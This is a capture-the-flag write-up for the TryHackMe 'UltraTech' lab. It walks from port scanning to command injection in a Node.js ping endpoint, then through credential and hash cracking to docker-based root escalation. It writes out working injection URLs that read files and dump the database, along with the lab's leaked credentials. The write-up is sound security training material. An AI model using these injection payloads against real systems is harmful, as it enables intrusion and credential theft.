# TRYHACKME : UltraTech

## It's enumaration time!

### NMAP
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### PORT 8081
> **DIRECTORIES**
>> - /
>> - /auth
>> - /ping
>

### PORT 31331
> **DIRECTORIES**
>> - /index.html
>> - /.htaccess
>> - /.hta
>> - /.htpasswd
>> - /.css
>> - /favicon.ico
>> - /images
>> - /images
>> - /index.html
>> - /javascript
>> - /js
>> - /server-status
>> - /robots.txt !!!
>> ```
>> PORT 31331/robots.txt
>> 
>> - /Allow: *
>> - User-Agent: *
>> - Sitemap: /utech_sitemap.txt
>>```
>>
>> ```
>> /utech_sitemap.txt contains:
>> 
>>     /index.html
>>     /what.html
>>     /partners.html
>> ```
>> 
>>

## Let the fun begin
> ### PORT 31331/index.html
> The main page contains the following credentials:
> - John McFamicom | r00t
> - Francois LeMytho | P4c0
> - Alvaro Squalo | Sq4l
> - ultratech@yopmail.com
> 

> ### **PORT 8081/partners.html**
> The following is a login page.
> The source code has an interesting js code for api.
> ```
> (function() {
>     console.warn('Debugging ::');
>
>     function getAPIURL() {
> 	return `${window.location.hostname}:8081`
>     }
>
>     function checkAPIStatus() {
> 	const req = new XMLHttpRequest();
> 	try {
> 	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`    // !!! INTERESTING !!!
> 	    req.open('GET', url, true);
> 	    req.onload = function (e) {
> 		if (req.readyState === 4) {
> 		    if (req.status === 200) {
> 			console.log('The api seems to be running')
> 		    } else {
> 			console.error(req.statusText);
> 		    }
> 		}
> 	    };
> ...
> ```
>
> I copied the url and replace the `getAPIURL()` into the target ip. I also replaced `{window.location.hostname}` with my own THM IP.
>
> After submitting the url, I got a successful response:
> ```
> PING 10.4.124.80 (10.4.124.80) 56(84) bytes of data. 64 bytes from 10.4.124.80: icmp_seq=1 ttl=61 time=393 ms --- 10.4.124.80 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 393.368/393.368/393.368/0.000 ms 
> ```
> 
>> It seems to be working. Let's try to some command injection.
>>
>> After a few tries, I got some results:
>> 
>> ```
>> URL: [TARGET-IP]:8081/ping?ip=[MACHINE-IP]';'`pwd` 
>> 
>> ping: 10.4.124.80/home/www/api: Name or service not known 
>> ```
>>
>> This is the result with `ls` command:
>> ```
>> URL: 10.10.159.142:8081/ping?ip=10.4.124.80';'`ls`
>>
>> ping: utech.db.sqlite: Name or service not known 
>> ```
>>
>> I `cat` the following database and gave a big giveaway:
>> ```
>> URL: http://[TARGET-IP]:8081/ping?ip=[MACHINE-IP]';'`cat utech.db.sqlite`
>>
>> ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
>> ```
>> Obtained two credentials. Possibly a password hash. Ignore the �.
>>
>> I copied the hashes to an online hash cracker, and I got `n100906` and `mrsheafy`.
>>

## The root of all evil
Let's now proceed to the ftp service using the obtained credentials.

I was able to access the ftp with the `r00t` credential. 

I tried the `admin` credential in ftp and ssh, but no avail. But it worked in the login page of port `8081/partners.html` and directed to me to an html page with this message:
```
Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```

I remember there is a hidden directory from `/home/lp1` called `.config`. But I think it's not really important.

Let's get the root.

Let's access `r00t` with ftp again.

But it can't run `cat` command. So I tried the `r00t` credential in ssh and it worked.

It's time to do some escalation.

After a number of failed tries of some privilege escalation tactics, I finally found out that we can escalate using the docker.

Finally got the command from [GTFObins](https://gtfobins.github.io/gtfobins/docker/) to access root!

To get the private ssh, head to `/root/.ssh` directory and copy the first nine characters.

